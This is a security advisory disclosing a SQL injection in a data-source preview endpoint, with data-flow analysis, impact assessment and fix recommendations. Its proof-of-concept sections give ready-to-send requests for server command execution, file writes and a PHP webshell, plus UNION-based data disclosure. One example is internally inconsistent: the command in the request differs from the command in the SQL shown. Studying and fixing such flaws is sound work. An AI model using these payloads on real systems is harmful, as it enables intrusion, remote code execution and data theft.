# SQL Injection Vulnerability Report - datasource.py#preview

## Vulnerability Overview

**Vulnerability Type**: SQL Injection

A critical SQL injection vulnerability was discovered in the data preview interface. Attackers can execute arbitrary SQL queries by crafting malicious table names and WHERE clauses, leading to data leakage, data tampering, or privilege escalation.

---

## Vulnerability Location

-   **File**: `backend/apps/datasource/crud/datasource.py`
-   **Function**: `preview()`
-   **Line Numbers**: 291-363
-   **API Endpoint**: `POST /api/v1/datasource/previewData/{id}`
-   **Route Definition**: `backend/apps/datasource/api/datasource.py:228`

---

## Technical Details

### 1. Root Cause Analysis

The `preview()` function uses **f-string to directly concatenate user-controlled parameters** into SQL statements without any filtering, escaping, or parameterization:

**Core Vulnerable Code** (datasource.py:328-331):

```python
if ds.type == "mysql" or ds.type == "doris" or ds.type == "starrocks":
    sql = f"""SELECT `{"`, `".join(fields)}` FROM `{data.table.table_name}`
        {where}
        LIMIT 100"""
```

### 2. Injection Point Analysis

#### Primary Injection Point: `data.table.table_name`

**Data Flow Trace**:

```
HTTP Request Body (JSON)
  ↓
TableObj.table.table_name (user-controlled)
  ↓
f"... FROM `{data.table.table_name}` ..." (direct concatenation)
  ↓
exec_sql(ds, sql, True) (execution)
```

**Key Issues**:

-   `TableObj` is a Pydantic/SQLModel model that receives JSON request body
-   Although `table.id` must be an existing ID in the database, the `table.table_name` field is **overwritten** by the value in the request body
-   The code only queries the field list corresponding to `table.id` (line 299), but uses the `table_name` from the request body when executing SQL

#### Secondary Injection Point: `where` clause

**Data Flow Trace**:

```
get_row_permission_filters()
  ↓
filter_mapping[0].get('filter') (permission filter conditions)
  ↓
where = ' where ' + where_str (direct concatenation)
  ↓
f"... {where} LIMIT 100" (direct concatenation)
```

If an attacker can control row-level permission configuration (e.g., by modifying the `DsPermission` table through other vulnerabilities), the `where` clause can also become an injection point.

### 3. Affected Database Types

All supported database types are affected:

| Database Type                | Code Lines | Injection Example                          |
| ---------------------------- | ---------- | ------------------------------------------ |
| MySQL/Doris/StarRocks        | 328-331    | `` `table` WHERE 1=0 UNION SELECT... -- `` |
| SQL Server                   | 332-335    | `[table]] WHERE 1=0 UNION SELECT... --`    |
| PostgreSQL/Redshift/Kingbase | 336-339    | `"table" WHERE 1=0 UNION SELECT... --`     |
| Oracle                       | 340-350    | `"table" WHERE 1=0 UNION SELECT... --`     |
| ClickHouse                   | 351-354    | `"table" WHERE 1=0 UNION SELECT... --`     |
| DM Dameng                    | 355-358    | `"table" WHERE 1=0 UNION SELECT... --`     |
| Elasticsearch                | 359-362    | `"table" WHERE 1=0 UNION SELECT... --`     |

---

## Exploitation Requirements

### Prerequisites

1. ✅ **Authenticated User**: Requires a valid JWT token (regular user privileges are sufficient)
2. ✅ **Data Source Exists**: At least one configured data source must exist in the system
3. ✅ **Known Data Source ID**: Attacker needs to obtain the data source ID (can be enumerated via API)

### Permission Requirements

-   **No Special Permission Restrictions**: The endpoint does not use the `@require_permissions` decorator
-   **Exploitable by Regular Users**: Row permission checks (line 307) only restrict returned fields and do not prevent SQL injection

---

## POC and Verification

### Verification Steps

1. Login to the system with a valid account to obtain JWT token
2. Retrieve data source list and IDs via `GET /api/v1/datasource/list`
3. Retrieve any table ID and field information via `GET /api/v1/table/list/{ds_id}`
4. Send a POST request with malicious `table_name` to `/api/v1/datasource/previewData/{ds_id}`
5. Observe whether the response returns the results of the injected query

### Scenario 1: PostgreSQL - Remote Code Execution (RCE)

**Attack Principle**: Exploit PostgreSQL's `COPY TO PROGRAM` feature to execute system commands

**Complete HTTP Request**:

```http
POST /api/v1/datasource/previewData/1 HTTP/1.1
Host: 127.0.0.1:8003
Content-Type: application/json
X-SQLBOT-TOKEN: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiYWNjb3VudCI6ImFkbWluIiwib2lkIjoxLCJleHAiOjE3NzAxMzUyMjJ9.j07AdgaDXsooAMb02FuQjyPWG4v5dovmtYf-6hz9Kys

{
  "table": {
    "table_comment": "",
    "table_name": "config\" ;DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'touch /tmp/aab';SELECT * FROM cmd_exec;select 1 -- ",
    "id": 1,
    "ds_id": 1,
    "checked": true,
    "custom_comment": ""
  },
  "fields": [
    {
      "field_name": "id",
      "id": 1,
      "checked": true,
      "field_comment": null,
      "field_index": 0,
      "table_id": 1,
      "ds_id": 1,
      "field_type": "integer",
      "custom_comment": null
    },
    {
      "field_name": "key",
      "id": 2,
      "checked": true,
      "field_comment": null,
      "field_index": 1,
      "table_id": 1,
      "ds_id": 1,
      "field_type": "character varying(50)",
      "custom_comment": null
    },
    {
      "field_name": "value",
      "id": 3,
      "checked": true,
      "field_comment": null,
      "field_index": 2,
      "table_id": 1,
      "ds_id": 1,
      "field_type": "text",
      "custom_comment": null
    }
  ]
}
```

**Generated Malicious SQL**:

```sql
SELECT "id", "key", "value" FROM "public"."config" ;
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'mkdir aab';
SELECT * FROM cmd_exec;
select 1 -- "
LIMIT 100
```

**Attack Impact**:

-   Creates directory `aab` on the database server
-   Can be replaced with any system command (e.g., reverse shell, data exfiltration, etc.)
-   Verification method: Check if the `aab` directory was created on the database server filesystem

### Scenario 2: PostgreSQL - Arbitrary File Write

**Attack Principle**: Exploit PostgreSQL's `COPY TO` functionality to write arbitrary files to the server

**Complete HTTP Request**:

```http
POST /api/v1/datasource/previewData/1 HTTP/1.1
Host: 127.0.0.1:8003
Content-Type: application/json
X-SQLBOT-TOKEN: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiYWNjb3VudCI6ImFkbWluIiwib2lkIjoxLCJleHAiOjE3NzAxMzUyMjJ9.j07AdgaDXsooAMb02FuQjyPWG4v5dovmtYf-6hz9Kys

{
  "table": {
    "table_comment": "",
    "table_name": "config\" ;copy (select 'abc') to '/tmp/bbb.txt';select 1 -- ",
    "id": 1,
    "ds_id": 1,
    "checked": true,
    "custom_comment": ""
  },
  "fields": [
    {
      "field_name": "id",
      "id": 1,
      "checked": true,
      "field_comment": null,
      "field_index": 0,
      "table_id": 1,
      "ds_id": 1,
      "field_type": "integer",
      "custom_comment": null
    },
    {
      "field_name": "key",
      "id": 2,
      "checked": true,
      "field_comment": null,
      "field_index": 1,
      "table_id": 1,
      "ds_id": 1,
      "field_type": "character varying(50)",
      "custom_comment": null
    },
    {
      "field_name": "value",
      "id": 3,
      "checked": true,
      "field_comment": null,
      "field_index": 2,
      "table_id": 1,
      "ds_id": 1,
      "field_type": "text",
      "custom_comment": null
    }
  ]
}
```

**Generated Malicious SQL**:

```sql
SELECT "id", "key", "value" FROM "public"."config" ;
copy (select 'abc') to '/tmp/bbb.txt';
select 1 -- "
LIMIT 100
```

**Attack Impact**:

-   Writes content `abc` to `/tmp/bbb.txt` on the database server
-   Can write webshells, SSH keys, crontab scheduled tasks, and other malicious content
-   Verification method: Execute `cat /tmp/bbb.txt` on the database server, should see `abc` content

**Advanced Exploitation Example**:

```json
{
    "table_name": "config\" ;copy (select '<?php system($_GET[\"c\"]);?>') to '/var/www/html/shell.php';select 1 -- "
}
```

Write a PHP webshell for persistent control

### Scenario 3: MySQL - Database Information Disclosure

**Attack Principle**: Use UNION injection to query sensitive database information

**HTTP Request**:

```http
POST /api/v1/datasource/previewData/2 HTTP/1.1
Host: 127.0.0.1:8003
Content-Type: application/json
X-SQLBOT-TOKEN: Bearer <valid_jwt_token>

{
  "table": {
    "table_name": "users` WHERE 1=0 UNION SELECT user(),database(),version() -- ",
    "id": 5,
    "ds_id": 2,
    "checked": true
  },
  "fields": [
    {"field_name": "id", "id": 10, "checked": true, "table_id": 5, "ds_id": 2, "field_type": "int"},
    {"field_name": "username", "id": 11, "checked": true, "table_id": 5, "ds_id": 2, "field_type": "varchar"},
    {"field_name": "email", "id": 12, "checked": true, "table_id": 5, "ds_id": 2, "field_type": "varchar"}
  ]
}
```

**Generated Malicious SQL**:

```sql
SELECT `id`, `username`, `email` FROM `users` WHERE 1=0 UNION SELECT user(),database(),version() -- `
LIMIT 100
```

**Attack Impact**:

-   Leak database username (e.g., `root@localhost`)
-   Leak current database name
-   Leak MySQL version information
-   Can further UNION query data from other tables (e.g., admin passwords, other data source credentials, etc.)

### Verification Confirmation Methods

-   **Response SQL Field**: The `sql` field in the API response returns the complete concatenated SQL, allowing direct inspection of the injected payload
-   **Response Data Field**: The `data` field in the response returns the results of the injected query
-   **Filesystem Verification**: For file writes and command execution, requires login to the database server for verification
-   **Time-based Blind Injection**: If results cannot be directly observed, use `SLEEP(5)` (MySQL) or `pg_sleep(5)` (PostgreSQL) to observe response delay

---

## Impact Assessment

### Confidentiality Impact (High)

-   ✅ Read arbitrary database table data (bypass application-layer permission controls)
-   ✅ Leak database configuration information (username, version, schema, etc.)
-   ✅ Leak connection credentials of other data sources (if stored in the same database)

### Integrity Impact (High)

-   ✅ Modify data through stacked queries (supported by some databases like SQL Server, PostgreSQL)
-   ✅ Delete data tables or records

### Availability Impact (High)

-   ✅ Conduct DoS attacks through time-consuming queries
-   ✅ Service interruption by deleting critical data

### Potential Attack Paths

1. **Lateral Movement**: Obtain encrypted credentials of other data sources through the `core_datasource` table
2. **Privilege Escalation**: Query the `core_user` table to obtain admin tokens or modify user permissions
3. **Persistence**: Plant backdoors in the database (e.g., create admin accounts)
4. **Supply Chain Attack**: Modify embedded data (`embedding` field) to poison AI models

---

## Vulnerability Verification

### Verification Steps

1. Login to the system with a valid account to obtain JWT token
2. Retrieve data source list and IDs via `GET /api/v1/datasource/list`
3. Retrieve any table ID via `GET /api/v1/table/list/{ds_id}`
4. Send a POST request with malicious `table_name` to `/api/v1/datasource/previewData/{ds_id}`
5. Observe whether the response returns the results of the injected query

### Confirmation Methods

-   View the complete concatenated SQL in the response's `sql` field
-   View the injected query results in the response's `data` field
-   Confirm injection existence through time-based blind injection (`SLEEP()`, `WAITFOR DELAY`)

---

## Remediation Recommendations

### Immediate Measures (Temporary Mitigation)

1. Whitelist validation for `table_name`:

    ```python
    # Query the real table name from the database, do not use the value from request body
    table_obj = session.get(CoreTable, data.table.id)
    if not table_obj:
        raise HTTPException(status_code=404, detail="Table not found")
    table_name = table_obj.table_name  # Use the actual value from the database
    ```

2. Add table name format validation (only allow letters, numbers, underscores):
    ```python
    import re
    if not re.match(r'^[a-zA-Z0-9_]+$', table_name):
        raise HTTPException(status_code=400, detail="Invalid table name")
    ```

### Root Solution

1. **Use Parameterized Queries**:

    - Use SQLAlchemy's `text()` with parameter binding
    - Example: `text("SELECT * FROM :table_name").bindparams(table_name=table_name)`
    - Note: Table names and column names cannot be directly parameterized; identifier quoting is required

2. **Use SQLAlchemy ORM**:

    ```python
    from sqlalchemy import select, column, table as sql_table

    tbl = sql_table(table_name)
    cols = [column(f) for f in fields]
    stmt = select(*cols).select_from(tbl).limit(100)

    if where_conditions:
        stmt = stmt.where(text(where_conditions))
    ```

3. **Use Database Identifier Escaping Functions**:

    ```python
    from apps.db.constant import DB
    db = DB.get_db(ds.type)

    # Use database-specific escaping methods
    escaped_table = db.escape_identifier(table_name)
    escaped_fields = [db.escape_identifier(f) for f in fields]
    ```

4. **Add Strict Input Validation**:
    - Table names must be queried from the database; client overrides not allowed
    - Field names must be validated against database metadata whitelist
    - WHERE clauses should use AST parsing validation (to avoid nested injection)

---
